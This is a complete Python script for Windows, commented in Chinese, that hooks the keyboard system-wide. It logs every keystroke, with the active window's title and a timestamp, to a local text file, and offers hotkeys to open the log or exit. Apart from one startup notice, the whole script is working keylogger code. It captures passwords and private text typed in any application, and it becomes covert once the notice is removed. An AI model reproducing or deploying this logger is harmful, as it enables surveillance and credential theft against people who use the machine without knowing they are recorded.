# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import PyHook3
import win32clipboard
import os
import sys
import time
import tkinter as tk
from tkinter import messagebox
import keyboard

# 弹出提示框
def show_notification():
    root = tk.Tk()
    root.withdraw()  # 隐藏主窗口
    messagebox.showinfo("KbMonitor", "程序正在后台运行，Ctrl+F11打开按键记录，Ctrl+F12关闭程序")

# 打开 KeyBoardListen.txt
def open_file():
    os.startfile(path + "/KeyBoardListen.txt")

# 结束程序进程标记
program_closed = False

# 结束程序进程
def exit_program(): 
    global program_closed
    program_closed = True

path = os.getcwd()

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# 定义击键监听事件函数
def OnKeyboardEvent(event):
    global current_window, path
    FileStr = ""
    
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.Window != current_window:
        current_window = event.Window
        # event.WindowName 有时候会不好用，所以调用底层 API 获取窗口标题
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(event.Window, byref(windowTitle), 512)
        windowName = windowTitle.value.decode('gbk')
        FileStr += "\n" + ("-"*50) + "\n窗口:%s\n时间:%s\n" % (windowName, time.strftime('%Y-%m-%d %H:%M:%S'))
    
    # 检测击键是否常规按键（非组合键等）
    if 32 < event.Ascii < 127:
        # 检查 Caps Lock 键是否被激活
        if user32.GetKeyState(20) & 1:
            FileStr += chr(event.Ascii).upper()
        else:
            FileStr += chr(event.Ascii).lower()
    else:
        if event.Key == "Space":
            FileStr += " "
        elif event.Key == "Return":
            FileStr += "[回车] "
        elif event.Key == "Back":
            FileStr += "[删除] "
    
    # 写入文件
    with open(path + "/KeyBoardListen.txt", "a", encoding='utf-8') as fp:
        fp.write(FileStr)
    
    # 循环监听下一个击键事件
    return True

# 创建并注册 hook 管理器
kl = PyHook3.HookManager()
kl.KeyDown = OnKeyboardEvent

# 弹出提示框
show_notification()

# 写入日期
with open(path + "/KeyBoardListen.txt", "a", encoding='utf-8') as fp:
    fp.write('\n\n' + '#######################################'
             + '\n#' + ' ' * 9 + time.strftime('%Y-%m-%d %H:%M:%S') + ' ' * 9 + '#'
             + '\n' + '#######################################')

# 注册 hook 并执行
kl.HookKeyboard()

# 监听组合键
keyboard.add_hotkey('ctrl+f11', open_file)
keyboard.add_hotkey('ctrl+f12', exit_program)

# 主循环，保持程序运行
while True:
    pythoncom.PumpWaitingMessages()
    if program_closed:
        messagebox.showinfo("KbMonitor", "程序已经关闭")
        break
    time.sleep(0.1)
